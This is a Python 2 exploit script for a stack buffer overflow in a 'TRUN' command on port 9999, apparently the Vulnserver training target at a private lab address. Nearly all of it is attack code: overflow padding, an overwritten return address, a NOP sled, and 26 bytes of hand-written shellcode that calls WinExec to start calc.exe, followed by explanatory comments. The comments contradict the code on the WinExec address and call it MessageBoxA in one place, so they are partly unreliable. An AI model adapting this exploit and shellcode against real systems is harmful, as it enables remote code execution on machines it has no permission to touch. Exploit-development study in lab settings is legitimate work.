#!/usr/bin/python

import socket, sys
from time import sleep

padding = "A" * 2002
EIP = "\xeb\x11\x50\x62"
offset = "C"*50
NOPS = "\x90"*15

# arwin.exe kernel.dll MeassageBoxA (0x7c8623ad)

WinExec = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
"\x68\x63\x61\x6C\x63"              # PUSH "calc"
"\x89\xe0"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\xAD\x23\x86\x7C"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	s.connect(('192.168.100.29',9999))
	s.recv(1024)

	print '[*] Send buffer'
	s.send("TRUN /.:/ " + padding + EIP + NOPS + WinExec)
	s.close()
	sleep(1)

except Exception as e:
	print(str(e))
	sys.exit()

#----------------------------------------------------------------------------------#
# (*) WinExec                                                                      #
# (*) arwin.exe => Kernel32.dll - WinExec 0x7C862AED                               #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# UINT WINAPI WinExec(            => PTR to WinExec                                #
#   __in  LPCSTR lpCmdLine,       => calc.exe                                      #
#   __in  UINT uCmdShow           => 0x1                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 26-bytes (metasploit version size => 227-bytes)                    #
#----------------------------------------------------------------------------------#
